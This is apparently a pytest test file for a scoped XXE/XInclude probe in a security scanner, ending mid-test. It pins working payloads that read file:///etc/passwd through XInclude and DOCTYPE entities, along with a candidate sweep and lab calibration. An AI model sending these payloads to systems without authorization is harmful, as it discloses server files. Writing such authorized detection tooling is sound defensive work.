from urllib.parse import parse_qs

import aiohttp
from multidict import CIMultiDict
import pytest

from tools.web_xxe_probe import (
    EXPECTED_STEP_LABELS,
    FIXED_DOCTYPE_PAYLOAD,
    FIXED_XML_CONTROL_BODY,
    XML_CONTENT_TYPE,
    LAB_EXPECTED_STEP_LABELS,
    FIXED_XINCLUDE_PAYLOAD,
    MAX_XXE_EVIDENCE_CHARS,
    PROOF_MARKER,
    XxeProbeTool,
    build_form_bodies,
    build_http_evidence_step,
    build_nuclei_finding,
    validate_probe_parameters,
)


def _parameters(**overrides):
    params = {
        "target": "https://lab.test/",
        "mode": "xinclude-form-file-read",
        "proofLevel": "lab-state-change",
        "statusPath": "/",
        "endpointPath": "/product/stock",
        "injectionField": "productId",
        "baselineValue": "1",
        "additionalFields": {"storeId": "1"},
        "unsolvedMarker": "Not solved",
        "solvedMarker": "Solved",
        "expectedBaselineStatus": 200,
        "expectedProbeStatus": 200,
        "engagement": "lab",
        "allowUnsafeMethods": True,
        "timeoutSeconds": 5,
    }
    params.update(overrides)
    return params


def _runtime_parameters(**overrides):
    """#1648 — the real-target tier: nothing a customer application lacks."""
    params = {
        "target": "https://app.test/",
        "mode": "xinclude-form-file-read",
        "proofLevel": "runtime-evaluation",
        "endpointPath": "/product/stock",
        "injectionField": "productId",
        "baselineValue": "1",
        "additionalFields": {"storeId": "1"},
        "engagement": "aggressive",
        "allowUnsafeMethods": True,
        "timeoutSeconds": 5,
    }
    params.update(overrides)
    return params


def _response(status, body, headers=None, truncated=False):
    return {
        "status": status,
        "reason": "OK",
        "headers": CIMultiDict(headers or {}),
        "body": body,
        "truncated": truncated,
    }


def test_registration_and_schema_expose_only_bounded_xinclude_mode():
    tool = XxeProbeTool()

    assert tool.name == "web:xxe_probe"
    assert tool.metadata["category"] == "exploit-test"
    # #1650 — a second DELIVERY for the same fixed local-file read. Both payloads
    # remain server-owned constants; neither mode accepts caller-supplied XML.
    assert tool.schema["properties"]["mode"]["enum"] == [
        "doctype-entity-xml-body",
        "xinclude-form-file-read",
    ]
    for forbidden in (
        "payload",
        "xml",
        "rawXml",
        "uri",
        "fileUri",
        "headers",
        "cookies",
        "cookie",
        "oobUrl",
    ):
        assert forbidden not in tool.schema["properties"]


def test_validation_requires_scope_plain_fields_statuses_and_bounded_timeout():
    assert validate_probe_parameters(_parameters()) == (True, "")
    assert validate_probe_parameters(_parameters(engagement="standard"))[0] is False
    assert validate_probe_parameters(_parameters(allowUnsafeMethods=False))[0] is False
    assert validate_probe_parameters(_parameters(target="https://user:pass@lab.test/"))[0] is False
    assert validate_probe_parameters(_parameters(endpointPath="//evil.test/stock"))[0] is False
    assert validate_probe_parameters(_parameters(injectionField="bad field"))[0] is False
    assert validate_probe_parameters(_parameters(injectionField="sessionToken"))[0] is False
    assert validate_probe_parameters(_parameters(baselineValue="<foo/>"))[0] is False
    assert validate_probe_parameters(_parameters(baselineValue="file:///etc/shadow"))[0] is False
    assert validate_probe_parameters(_parameters(additionalFields={"csrf": "x"}))[0] is False
    assert validate_probe_parameters(
        _parameters(additionalFields={f"field{i}": str(i) for i in range(8)})
    )[0] is False
    assert validate_probe_parameters(_parameters(expectedProbeStatus=600))[0] is False
    assert validate_probe_parameters(_parameters(timeoutSeconds=31))[0] is False


def test_form_builder_hard_codes_only_the_reviewed_xinclude_payload():
    clean, attack = build_form_bodies("productId", "7", {"storeId": "1"})

    clean_fields = parse_qs(clean, strict_parsing=True)
    attack_fields = parse_qs(attack, strict_parsing=True)
    assert clean_fields == {"productId": ["7"], "storeId": ["1"]}
    assert attack_fields == {
        "productId": [FIXED_XINCLUDE_PAYLOAD],
        "storeId": ["1"],
    }
    assert (
        FIXED_XINCLUDE_PAYLOAD
        == '<foo xmlns:xi="http://www.w3.org/2001/XInclude">'
        '<xi:include parse="text" href="file:///etc/passwd"/></foo>'
    )
    assert PROOF_MARKER == "root:x:0:0"


def test_http_evidence_preserves_form_request_and_redacts_response_secrets():
    response = _response(
        200,
        '{"session":"live-session","result":"root:x:0:0:root:/root:/bin/bash"}',
        {
            "Content-Type": "application/json",
            "Set-Cookie": "session=live-session",
            "Authorization": "Bearer live-session",
        },
    )
    _clean, attack = build_form_bodies("productId", "1", {"storeId": "1"})

    step = build_http_evidence_step(
        "xinclude-file-read",
        "POST",
        "https://lab.test/product/stock",
        attack,
        response,
        ("live-session",),
    )

    assert step["request"].startswith("POST /product/stock HTTP/1.1")
    assert "Content-Type: application/x-www-form-urlencoded" in step["request"]
    assert "productId=%3Cfoo+" in step["request"]
    assert "Content-Type: application/json" in step["response"]
    assert "Set-Cookie" not in step["response"]
    assert "Authorization" not in step["response"]
    assert "live-session" not in str(step)
    assert "<redacted-runtime-secret>" in step["response"]
    assert PROOF_MARKER in step["response"]
    assert len(step["requestSha256"]) == 64
    assert len(step["responseSha256"]) == 64
    assert len(step["responseBodySha256"]) == 64


def test_finding_shape_is_high_cwe_611_and_keeps_typed_proof():
    verification = {
        "verified": True,
        "fallback": False,
        "mode": "xinclude-form-file-read",
        "endpointUrl": "https://lab.test/product/stock",
    }

    finding = build_nuclei_finding("https://lab.test/", verification)

    assert finding["template-id"] == "xasm-xinclude-local-file-read-verified"
    assert finding["info"]["severity"] == "high"
    assert finding["info"]["classification"]["cwe-id"] == ["CWE-611"]
    assert finding["matched-at"] == "https://lab.test/product/stock"
    assert finding["evidence"] is verification


@pytest.mark.asyncio
async def test_execute_emits_four_typed_request_response_steps(monkeypatch):
    tool = XxeProbeTool()
    calls = []
    responses = [
        _response(200, "Lab status: Not solved"),
        _response(200, "Only 321 units available"),
        _response(
            200,
            "Only 321 units available\nroot:x:0:0:root:/root:/bin/bash",
        ),
        _response(200, "Lab status: Solved"),
    ]

    async def fake_request(_session, method, url, body=None, content_type="application/x-www-form-urlencoded"):
        calls.append((method, url, body))
        return responses.pop(0)

    monkeypatch.setattr(tool, "_request", fake_request)

    output = await tool.execute(_parameters())

    assert output["success"] is True
    assert output["fallback"] is False
    assert output["coverageStatus"] == "CONFIRMED"
    assert output["requestCount"] == 4
    verification = output["verification"]
    assert verification["verified"] is True
    assert verification["requestCount"] == 4
    assert verification["statusChecks"] == 2
    assert verification["cleanRequests"] == 1
    assert verification["probeRequests"] == 1
    assert verification["solvedBefore"] is False
    assert verification["cleanBaselineStatusMatched"] is True
    assert verification["cleanProofMarkerAbsent"] is True
    assert verification["probeStatusMatched"] is True
    assert verification["probeProofMarkerPresent"] is True
    assert verification["solvedAfter"] is True
    assert [step["label"] for step in verification["httpEvidence"]["steps"]] == list(
        EXPECTED_STEP_LABELS
    )
    assert [call[0] for call in calls] == ["GET", "POST", "POST", "GET"]
    assert calls[0][2] is None
    assert parse_qs(calls[1][2])["productId"] == ["1"]
    assert parse_qs(calls[2][2])["productId"] == [FIXED_XINCLUDE_PAYLOAD]
    assert calls[3][2] is None
    assert output["findings"][0]["evidence"] is verification


@pytest.mark.asyncio
async def test_execute_retains_full_port_swigger_sized_status_pages(monkeypatch):
    tool = XxeProbeTool()
    padding = "x" * 10_500
    responses = [
        _response(200, f"{padding}Lab status: Not solved"),
        _response(200, "Only 321 units available"),
        _response(200, f"Only 321 units available\n{PROOF_MARKER}"),
        _response(200, f"{padding}Lab status: Solved"),
    ]

    async def fake_request(_session, _method, _url, body=None, content_type="application/x-www-form-urlencoded"):
        return responses.pop(0)

    monkeypatch.setattr(tool, "_request", fake_request)

    output = await tool.execute(_parameters())

    assert output["success"] is True
    steps = output["verification"]["httpEvidence"]["steps"]
    assert len(steps[0]["response"]) > 10_000
    assert len(steps[3]["response"]) > 10_000
    assert all(step["responseExcerptTruncated"] is False for step in steps)


@pytest.mark.asyncio
@pytest.mark.asyncio
async def test_execute_reports_clean_negative_without_failing_required_tool(monkeypatch):
    tool = XxeProbeTool()
    queued = [
        _response(200, "Lab status: Not solved"),
        _response(200, "clean"),
        _response(200, "marker missing"),
    ]

    async def fake_request(_session, _method, _url, body=None, content_type="application/x-www-form-urlencoded"):
        return queued.pop(0)

    monkeypatch.setattr(tool, "_request", fake_request)

    output = await tool.execute(_parameters())

    assert output["success"] is True
    assert output["fallback"] is False
    assert output["verified"] is False
    assert output["coverageStatus"] == "COMPLETE_NO_FINDING"
    assert output["findings"] == []
    assert "probe response did not carry the marker" in output["reason"]


@pytest.mark.asyncio
async def test_execute_reports_preexisting_control_marker_as_incomplete(monkeypatch):
    tool = XxeProbeTool()
    queued = [
        _response(200, "Lab status: Not solved"),
        _response(200, f"unexpected {PROOF_MARKER}"),
    ]

    async def fake_request(_session, _method, _url, body=None, content_type="application/x-www-form-urlencoded"):
        return queued.pop(0)

    monkeypatch.setattr(tool, "_request", fake_request)

    output = await tool.execute(_parameters())

    assert output["success"] is True
    assert output["verified"] is False
    assert output["coverageStatus"] == "INCOMPLETE"
    assert output["findings"] == []
    assert "control already discloses the file marker" in output["reason"]


@pytest.mark.asyncio
async def test_execute_still_fails_when_lab_solved_transition_is_missing(monkeypatch):
    tool = XxeProbeTool()
    queued = [
        _response(200, "Lab status: Not solved"),
        _response(200, "clean"),
        _response(200, PROOF_MARKER),
        _response(200, "Lab status: Not solved"),
    ]

    async def fake_request(_session, _method, _url, body=None, content_type="application/x-www-form-urlencoded"):
        return queued.pop(0)

    monkeypatch.setattr(tool, "_request", fake_request)

    output = await tool.execute(_parameters())

    assert output["success"] is False
    assert output["findings"] == []
    assert "solved transition" in output["error"]


@pytest.mark.asyncio
async def test_execute_fails_closed_when_any_retained_response_is_truncated(monkeypatch):
    tool = XxeProbeTool()
    responses = [
        _response(200, "Lab status: Not solved"),
        _response(200, "clean"),
        _response(200, PROOF_MARKER, truncated=True),
    ]

    async def fake_request(_session, _method, _url, body=None, content_type="application/x-www-form-urlencoded"):
        return responses.pop(0)

    monkeypatch.setattr(tool, "_request", fake_request)

    output = await tool.execute(_parameters())

    assert output["success"] is True
    assert output["fallback"] is False
    assert output["verified"] is False
    assert output["coverageStatus"] == "INCOMPLETE"
    assert output["requestCount"] >= 3
    assert output["findings"] == []
    assert "no candidate returned the /etc/passwd proof marker" in output["reason"]
    assert "probe response was not bounded" in output["reason"]


@pytest.mark.asyncio
async def test_execute_fails_closed_when_transcript_would_be_truncated(monkeypatch):
    tool = XxeProbeTool()
    responses = [
        _response(200, "Lab status: Not solved"),
        _response(200, "clean"),
        _response(200, PROOF_MARKER + ("x" * MAX_XXE_EVIDENCE_CHARS)),
    ]

    async def fake_request(_session, _method, _url, body=None, content_type="application/x-www-form-urlencoded"):
        return responses.pop(0)

    monkeypatch.setattr(tool, "_request", fake_request)

    output = await tool.execute(_parameters())

    assert output["success"] is True
    assert output["fallback"] is False
    assert output["verified"] is False
    assert output["coverageStatus"] == "INCOMPLETE"
    assert output["findings"] == []
    assert "no candidate returned the /etc/passwd proof marker" in output["reason"]
    assert "probe response was not bounded" in output["reason"]


# --- #1647: marker present ⇒ confirmed; expected*Status annotates, never vetoes ---


def test_expected_statuses_are_optional_corroboration_not_preconditions():
    tool = XxeProbeTool()

    # A discovery-driven run cannot know the vulnerable response's status code
    # in advance — knowing it means you have already exploited the target.
    assert "expectedBaselineStatus" not in tool.schema["required"]
    assert "expectedProbeStatus" not in tool.schema["required"]

    params = _parameters()
    params.pop("expectedBaselineStatus")
    params.pop("expectedProbeStatus")
    assert validate_probe_parameters(params) == (True, "")

    # Still validated when actually supplied.
    assert validate_probe_parameters(_parameters(expectedProbeStatus=600))[0] is False
    assert validate_probe_parameters(_parameters(expectedBaselineStatus="two hundred"))[0] is False


@pytest.mark.asyncio
async def test_execute_confirms_on_marker_under_an_unexpected_status(monkeypatch):
    """The exact #1647 repro: caller passed 200, the app answers 400 with the file
    concatenated into an error string. The read happened; the finding must exist."""
    tool = XxeProbeTool()
    responses = [
        _response(200, "Lab status: Not solved"),
        _response(200, "Only 321 units available"),
        _response(400, '"Invalid product ID: root:x:0:0:root:/root:/bin/bash"'),
        _response(200, "Lab status: Solved"),
    ]

    async def fake_request(_session, method, url, body=None, content_type="application/x-www-form-urlencoded"):
        return responses.pop(0)

    monkeypatch.setattr(tool, "_request", fake_request)

    output = await tool.execute(_parameters(expectedProbeStatus=200))

    # Pre-fix this returned success=False with zero findings.
    assert output["success"] is True
    assert len(output["findings"]) == 1
    verification = output["verification"]
    assert verification["probeProofMarkerPresent"] is True
    # The corroboration that missed is recorded, not swallowed.
    assert verification["probeStatusMatched"] is False
    assert verification["assertionMismatches"] == [
        {
            "assertion": "expectedProbeStatus/xinclude-file-read",
            "expected": 200,
            "observed": 400,
        }
    ]


@pytest.mark.asyncio
async def test_execute_confirms_with_no_expected_statuses_supplied(monkeypatch):
    tool = XxeProbeTool()
    responses = [
        _response(200, "Lab status: Not solved"),
        _response(200, "Only 321 units available"),
        _response(400, '"Invalid product ID: root:x:0:0:root:/root:/bin/bash"'),
        _response(200, "Lab status: Solved"),
    ]

    async def fake_request(_session, method, url, body=None, content_type="application/x-www-form-urlencoded"):
        return responses.pop(0)

    monkeypatch.setattr(tool, "_request", fake_request)

    params = _parameters()
    params.pop("expectedBaselineStatus")
    params.pop("expectedProbeStatus")
    output = await tool.execute(params)

    assert output["success"] is True
    verification = output["verification"]
    assert verification["assertionMismatches"] == []
    assert verification["probeStatusMatched"] is True
    assert verification["expectedProbeStatus"] is None


@pytest.mark.asyncio
async def test_execute_does_not_confirm_when_the_proof_marker_is_absent(monkeypatch):
    """A bounded marker-negative pair is completed coverage, never proof."""
    tool = XxeProbeTool()
    responses = [
        _response(200, "Lab status: Not solved"),
        _response(200, "Only 321 units available"),
        _response(400, '"Invalid product ID"'),  # no /etc/passwd content
        _response(200, "Lab status: Solved"),
    ]

    async def fake_request(_session, method, url, body=None, content_type="application/x-www-form-urlencoded"):
        return responses.pop(0)

    monkeypatch.setattr(tool, "_request", fake_request)

    output = await tool.execute(_parameters(expectedProbeStatus=400))

    assert output["success"] is True
    assert output["verified"] is False
    assert output["coverageStatus"] == "COMPLETE_NO_FINDING"
    assert output["findings"] == []
    assert "proof marker" in output["reason"]


@pytest.mark.asyncio
async def test_execute_marks_coverage_incomplete_when_the_control_leaks_the_marker(monkeypatch):
    """Marker in the benign control means the page discloses it anyway — the
    probe cannot attribute the disclosure to its payload."""
    tool = XxeProbeTool()
    responses = [
        _response(200, "Lab status: Not solved"),
        _response(200, "Only 321 units root:x:0:0:root available"),
        _response(400, '"Invalid product ID: root:x:0:0:root:/root:/bin/bash"'),
        _response(200, "Lab status: Solved"),
    ]

    async def fake_request(_session, method, url, body=None, content_type="application/x-www-form-urlencoded"):
        return responses.pop(0)

    monkeypatch.setattr(tool, "_request", fake_request)

    output = await tool.execute(_parameters())

    assert output["success"] is True
    assert output["verified"] is False
    assert output["coverageStatus"] == "INCOMPLETE"
    assert output["findings"] == []


@pytest.mark.asyncio
async def test_standard_engagement_is_a_clean_no_op_not_a_validation_error(monkeypatch):
    """The coordinator emits engagement='standard' whenever the operator has not
    opted into aggressive/lab/ctf. The phase doRules promise a clean no-op, and
    an error made a production-safe phase look broken. No request is sent."""
    tool = XxeProbeTool()
    calls = []

    async def fake_request(_session, method, url, body=None, content_type="application/x-www-form-urlencoded"):
        calls.append(method)
        raise AssertionError("standard engagement must not send any request")

    monkeypatch.setattr(tool, "_request", fake_request)

    output = await tool.execute(_parameters(engagement="standard"))

    assert output["success"] is True
    assert output["skipped"] is True
    assert output["findings"] == []
    assert output["requestCount"] == 0
    assert calls == []


# --- #1648: two-tier proofLevel — the real-target tier ---


def test_runtime_tier_needs_no_status_page_or_lab_markers():
    tool = XxeProbeTool()

    assert "proofLevel" in tool.schema["required"]
    for lab_only in ("statusPath", "unsolvedMarker", "solvedMarker"):
        assert lab_only not in tool.schema["required"]

    assert validate_probe_parameters(_runtime_parameters()) == (True, "")

    # Lab material on the runtime tier is a hard rejection, not a silent ignore —
    # otherwise a caller could believe a transition was proven when nothing
    # checked it.
    for lab_only in ("statusPath", "unsolvedMarker", "solvedMarker"):
        ok, reason = validate_probe_parameters(_runtime_parameters(**{lab_only: "/"}))
        assert ok is False
        assert lab_only in reason

    # The runtime tier is usable on a real authorized engagement.
    assert validate_probe_parameters(_runtime_parameters(engagement="aggressive"))[0] is True
    # The LAB tier is not.
    assert validate_probe_parameters(_parameters(engagement="aggressive"))[0] is False


def test_proof_level_is_never_defaulted():
    params = _runtime_parameters()
    params.pop("proofLevel")
    assert validate_probe_parameters(params)[0] is False
    assert validate_probe_parameters(_runtime_parameters(proofLevel="runtime-evalution"))[0] is False


@pytest.mark.asyncio
async def test_runtime_tier_emits_exactly_two_transactions(monkeypatch):
    tool = XxeProbeTool()
    calls = []
    responses = [
        _response(200, "Only 321 units available"),
        _response(400, '"Invalid product ID: root:x:0:0:root:/root:/bin/bash"'),
    ]

    async def fake_request(_session, method, url, body=None, content_type="application/x-www-form-urlencoded"):
        calls.append((method, url, body))
        return responses.pop(0)

    monkeypatch.setattr(tool, "_request", fake_request)

    output = await tool.execute(_runtime_parameters())

    assert output["success"] is True
    assert output["requestCount"] == 2
    verification = output["verification"]
    assert verification["proofLevel"] == "runtime-evaluation"
    assert verification["statusChecks"] == 0
    assert verification["cleanRequests"] == 1
    assert verification["probeRequests"] == 1
    assert [step["label"] for step in verification["httpEvidence"]["steps"]] == [
        "clean-form-baseline",
        "xinclude-file-read",
    ]
    # No lab material leaks into a real-target proof.
    for lab_only in ("statusPath", "unsolvedMarker", "solvedMarker", "solvedBefore", "solvedAfter"):
        assert lab_only not in verification
    # Only the endpoint was touched — no status page exists to poll.
    assert [call[0] for call in calls] == ["POST", "POST"]
    assert parse_qs(calls[1][2])["productId"] == [FIXED_XINCLUDE_PAYLOAD]


@pytest.mark.asyncio
async def test_runtime_tier_reconfirms_an_already_exploited_target(monkeypatch):
    """The lab contract asserted an UNSOLVED baseline as its FIRST request, so it
    could never confirm the same vulnerability twice — and on an already-solved
    instance it aborted before ever sending the payload."""
    tool = XxeProbeTool()

    def _fresh_responses():
        return [
            _response(200, "Only 321 units available"),
            _response(400, '"Invalid product ID: root:x:0:0:root:/root:/bin/bash"'),
        ]

    for _ in range(2):
        responses = _fresh_responses()

        async def fake_request(_session, method, url, body=None, content_type="application/x-www-form-urlencoded"):
            return responses.pop(0)

        monkeypatch.setattr(tool, "_request", fake_request)
        output = await tool.execute(_runtime_parameters())
        assert output["success"] is True
        assert len(output["findings"]) == 1


@pytest.mark.asyncio
async def test_runtime_tier_reports_complete_no_finding_without_the_marker(monkeypatch):
    tool = XxeProbeTool()
    responses = [
        _response(200, "Only 321 units available"),
        _response(400, '"Invalid product ID"'),
    ]

    async def fake_request(_session, method, url, body=None, content_type="application/x-www-form-urlencoded"):
        return responses.pop(0)

    monkeypatch.setattr(tool, "_request", fake_request)

    output = await tool.execute(_runtime_parameters())
    assert output["success"] is True
    assert output["verified"] is False
    assert output["coverageStatus"] == "COMPLETE_NO_FINDING"
    assert output["findings"] == []


@pytest.mark.asyncio
async def test_self_discovery_without_candidates_is_an_incomplete_skip(monkeypatch):
    tool = XxeProbeTool()
    calls = []

    async def fake_discover(*_args, **_kwargs):
        return []

    async def fake_request(*_args, **_kwargs):
        calls.append(True)
        raise AssertionError("no candidate means no active probe request")

    monkeypatch.setattr("tools.web_xxe_probe.discover_candidates", fake_discover)
    monkeypatch.setattr(tool, "_request", fake_request)
    params = _runtime_parameters(discoverCandidates=True)
    for sink_field in ("endpointPath", "injectionField", "baselineValue", "additionalFields"):
        params.pop(sink_field, None)

    output = await tool.execute(params)

    assert output["success"] is True
    assert output["verified"] is False
    assert output["skipped"] is True
    assert output["coverageStatus"] == "INCOMPLETE"
    assert output["requestCount"] == 0
    assert output["findings"] == []
    assert calls == []


@pytest.mark.asyncio
async def test_request_budget_exhaustion_is_incomplete_not_failed(monkeypatch):
    tool = XxeProbeTool()

    async def fake_request(
        _session,
        _method,
        _url,
        body=None,
        content_type="application/x-www-form-urlencoded",
    ):
        return _response(200, "bounded response without marker")

    monkeypatch.setattr(tool, "_request", fake_request)
    params = _runtime_parameters(maxRequests=2)
    for sink_field in ("endpointPath", "injectionField", "baselineValue", "additionalFields"):
        params.pop(sink_field, None)
    params["candidates"] = [
        {"url": "/first", "method": "POST", "fields": {"value": "1"}},
        {"url": "/second", "method": "POST", "fields": {"value": "2"}},
    ]

    output = await tool.execute(params)

    assert output["success"] is True
    assert output["verified"] is False
    assert output["coverageStatus"] == "INCOMPLETE"
    assert output["findings"] == []
    assert any(row.get("skipped") == "request budget exhausted" for row in output["candidateOutcomes"])


@pytest.mark.asyncio
async def test_candidate_transport_error_remains_a_real_failure(monkeypatch):
    tool = XxeProbeTool()

    async def failing_request(*_args, **_kwargs):
        raise aiohttp.ClientConnectionError("connection reset")

    monkeypatch.setattr(tool, "_request", failing_request)

    output = await tool.execute(_runtime_parameters())

    assert output["success"] is False
    assert output["findings"] == []
    assert "connection reset" in output["error"]


@pytest.mark.asyncio
async def test_lab_tier_still_emits_the_full_four_step_transition(monkeypatch):
    """The calibration path is unchanged — .claude/plans/1276-dast-xxe-solve.http
    must keep reproducing byte-for-byte."""
    tool = XxeProbeTool()
    responses = [
        _response(200, "Lab status: Not solved"),
        _response(200, "Only 321 units available"),
        _response(400, '"Invalid product ID: root:x:0:0:root:/root:/bin/bash"'),
        _response(200, "Lab status: Solved"),
    ]

    async def fake_request(_session, method, url, body=None, content_type="application/x-www-form-urlencoded"):
        return responses.pop(0)

    monkeypatch.setattr(tool, "_request", fake_request)

    output = await tool.execute(_parameters(expectedProbeStatus=400))

    assert output["success"] is True
    verification = output["verification"]
    assert verification["proofLevel"] == "lab-state-change"
    assert verification["requestCount"] == 4
    assert verification["solvedBefore"] is False
    assert verification["solvedAfter"] is True
    assert verification["unsolvedMarker"] == "Not solved"
    assert [step["label"] for step in verification["httpEvidence"]["steps"]] == list(
        LAB_EXPECTED_STEP_LABELS
    )


# --- #1650: candidate sweep + the raw-XML-body delivery ---


def test_doctype_mode_payload_is_a_server_owned_constant():
    from tools.web_xxe_probe import (
        FIXED_DOCTYPE_PAYLOAD,
        FIXED_XML_CONTROL_BODY,
        build_xml_bodies,
    )

    control, attack = build_xml_bodies()
    assert control == FIXED_XML_CONTROL_BODY
    assert attack == FIXED_DOCTYPE_PAYLOAD
    # Pinned so a silent edit fails: fixed file, fixed entity, no caller input.
    assert FIXED_DOCTYPE_PAYLOAD == (
        '<?xml version="1.0"?>'
        '<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
        "<r>&xxe;</r>"
    )
    assert PROOF_MARKER not in FIXED_XML_CONTROL_BODY


def test_sink_naming_fields_are_optional_once_candidates_are_supplied():
    params = _runtime_parameters()
    for sink_field in ("endpointPath", "injectionField", "baselineValue", "additionalFields"):
        params.pop(sink_field, None)
        assert sink_field not in XxeProbeTool().schema["required"]

    # With no sink AND no candidates the probe cannot know where to look.
    assert validate_probe_parameters(params)[0] is False

    # Discovery output alone is enough — this is the detector form.
    with_candidates = dict(params)
    with_candidates["candidates"] = [
        {"url": "https://app.test/product/stock", "method": "POST", "fields": {"productId": "1"}}
    ]
    assert validate_probe_parameters(with_candidates) == (True, "")

    # So is asking the probe to find its own sinks.
    self_discovering = dict(params)
    self_discovering["discoverCandidates"] = True
    assert validate_probe_parameters(self_discovering) == (True, "")


@pytest.mark.asyncio
async def test_sweep_finds_the_vulnerable_sink_among_several(monkeypatch):
    """#1650's headline: given only discovery output, the probe locates the sink
    itself rather than being told where it is."""
    tool = XxeProbeTool()
    seen = []

    async def fake_request(_session, _method, url, body=None, content_type="application/x-www-form-urlencoded"):
        seen.append(url)
        # The ATTACK body carries the XInclude payload; the control does not.
        if url.endswith("/product/stock") and "XInclude" in str(body):
            return _response(400, f'"Invalid product ID: {PROOF_MARKER}:root:/root:/bin/bash"')
        return _response(200, "42 units" if url.endswith("/product/stock") else "nothing")

    monkeypatch.setattr(tool, "_request", fake_request)

    params = _runtime_parameters()
    for sink_field in ("endpointPath", "injectionField", "baselineValue", "additionalFields"):
        params.pop(sink_field, None)
    params["candidates"] = [
        {"url": "/search", "method": "POST", "fields": {"q": "shoes"}},
        {"url": "/newsletter", "method": "POST", "fields": {"email": "a@b.test"}},
        {"url": "/product/stock", "method": "POST", "fields": {"productId": "1", "storeId": "1"}},
    ]
    output = await tool.execute(params)

    assert output["success"] is True
    verification = output["verification"]
    # The finding names the REAL sink, discovered rather than supplied.
    assert verification["firingCandidate"]["url"] == "https://app.test/product/stock"
    assert verification["firingCandidate"]["injectionField"] == "productId"
    assert verification["endpointPath"] == "/product/stock"
    # Per-candidate outcomes show what else was tried, in order.
    outcomes = verification["candidateOutcomes"]
    assert [row["confirmed"] for row in outcomes] == [False, False, True]
    # #1650 — both deliveries were attempted for the non-vulnerable candidates,
    # and each attempt is named so the operator can see what was tried.
    assert "xinclude-form-file-read" in outcomes[0]["reason"]
    assert "doctype-entity-xml-body" in outcomes[0]["reason"]


@pytest.mark.asyncio
async def test_xml_content_type_candidate_selects_the_doctype_delivery(monkeypatch):
    """An endpoint that already accepts XML has no injectable form field — the
    whole body is the payload. This is vulnlab VULN-19's shape."""
    tool = XxeProbeTool()
    sent = []

    async def fake_request(_session, _method, url, body=None, content_type="application/x-www-form-urlencoded"):
        sent.append((body, content_type))
        if PROOF_MARKER in str(body) or "DOCTYPE" in str(body):
            return _response(200, f'{{"ok":true,"text":"<r>{PROOF_MARKER}:root:/root:/bin/bash</r>"}}')
        return _response(200, '{"ok":true,"text":"<r>hi</r>"}')

    monkeypatch.setattr(tool, "_request", fake_request)

    params = _runtime_parameters()
    for sink_field in ("endpointPath", "injectionField", "baselineValue", "additionalFields"):
        params.pop(sink_field, None)
    params["candidates"] = [
        {
            "url": "/admin/import-xml",
            "method": "POST",
            "contentType": "application/xml",
            "fields": {},
        }
    ]
    output = await tool.execute(params)

    assert output["success"] is True
    verification = output["verification"]
    assert verification["mode"] == "doctype-entity-xml-body"
    assert verification["firingCandidate"]["url"] == "https://app.test/admin/import-xml"
    # Both requests carried an XML content type and a server-owned body.
    assert [ct for _, ct in sent] == ["application/xml", "application/xml"]
    assert sent[0][0] == '<?xml version="1.0"?><r>xasm-control</r>'
    assert "file:///etc/passwd" in sent[1][0]


@pytest.mark.asyncio
async def test_single_sink_verifier_form_is_unchanged(monkeypatch):
    """Every recorded calibration run used the single-sink form. It must keep
    producing byte-identical requests."""
    tool = XxeProbeTool()
    bodies = []

    async def fake_request(_session, _method, _url, body=None, content_type="application/x-www-form-urlencoded"):
        bodies.append(body)
        if body is None:
            return _response(200, "Lab status: Not solved" if len(bodies) == 1 else "Lab status: Solved")
        if "XInclude" in body:
            return _response(400, f'"Invalid product ID: {PROOF_MARKER}:root:/root:/bin/bash"')
        return _response(200, "42 units")

    monkeypatch.setattr(tool, "_request", fake_request)

    output = await tool.execute(_parameters(expectedProbeStatus=400))

    assert output["success"] is True
    assert output["verification"]["requestCount"] == 4
    assert parse_qs(bodies[1])["productId"] == ["1"]
    assert parse_qs(bodies[2])["productId"] == [FIXED_XINCLUDE_PAYLOAD]


@pytest.mark.asyncio
async def test_js_intercepted_form_falls_through_to_the_xml_delivery(monkeypatch):
    """#1650 regression from a live run.

    The PortSwigger "exploiting XXE to retrieve files" lab declares
    `<form action="/product/stock" method="POST">` with NO enctype — so discovery
    reads it as urlencoded — while `xmlStockCheckPayload.js` intercepts the
    submit and posts XML. Inferring a single delivery from the markup picked the
    form field, missed the raw-XML sink, and reported "no candidate fired" on a
    trivially vulnerable target.
    """
    tool = XxeProbeTool()
    attempts = []

    async def fake_request(_session, _method, url, body=None, content_type="application/x-www-form-urlencoded"):
        attempts.append(content_type)
        # The endpoint ONLY understands XML — the urlencoded delivery is inert.
        if content_type != XML_CONTENT_TYPE:
            return _response(400, '"Invalid product ID"')
        if "DOCTYPE" in str(body):
            return _response(400, f'"Invalid product ID: {PROOF_MARKER}:root:/root:/bin/bash"')
        return _response(200, "42 units")

    monkeypatch.setattr(tool, "_request", fake_request)

    params = _runtime_parameters()
    for sink_field in ("endpointPath", "injectionField", "baselineValue", "additionalFields"):
        params.pop(sink_field, None)
    # Exactly what self-discovery yields for that lab: a form with fields and no
    # declared content type.
    params["candidates"] = [
        {"url": "/product/stock", "method": "POST", "fields": {"productId": "1", "storeId": "1"}}
    ]
    output = await tool.execute(params)

    assert output["success"] is True
    verification = output["verification"]
    assert verification["mode"] == "doctype-entity-xml-body"
    assert verification["firingCandidate"]["url"] == "https://app.test/product/stock"
    # The urlencoded delivery was tried first and fell through to XML.
    assert attempts[0] == "application/x-www-form-urlencoded"
    assert XML_CONTENT_TYPE in attempts


def test_xml_body_carries_the_entity_inside_the_observed_field():
    """#1650 — the entity reference must sit INSIDE the element the application
    reads, or the document is rejected before any entity is expanded.

    Verified against the live PortSwigger lab: a bare `<r>&xxe;</r>` answers
    `"Product ID could not be parsed from XML" [400]`, while the same entity in
    `<productId>` is reflected. The root element name is irrelevant there
    (`<data>` and `<stockCheck>` behave identically), so it stays generic.
    """
    from tools.web_xxe_probe import build_bodies_for_mode

    control, attack = build_bodies_for_mode(
        "doctype-entity-xml-body", "productId", "1", {"storeId": "1"}
    )
    assert control == (
        '<?xml version="1.0" encoding="UTF-8"?>'
        "<data><productId>1</productId><storeId>1</storeId></data>"
    )
    assert attack == (
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
        "<data><productId>&xxe;</productId><storeId>1</storeId></data>"
    )
    # Control and attack differ ONLY by the doctype and the injected field.
    assert PROOF_MARKER not in control and "ENTITY" not in control

    # With no discovered field, fall back to the bare document — what an endpoint
    # that parses and echoes the whole payload needs (vulnlab VULN-19).
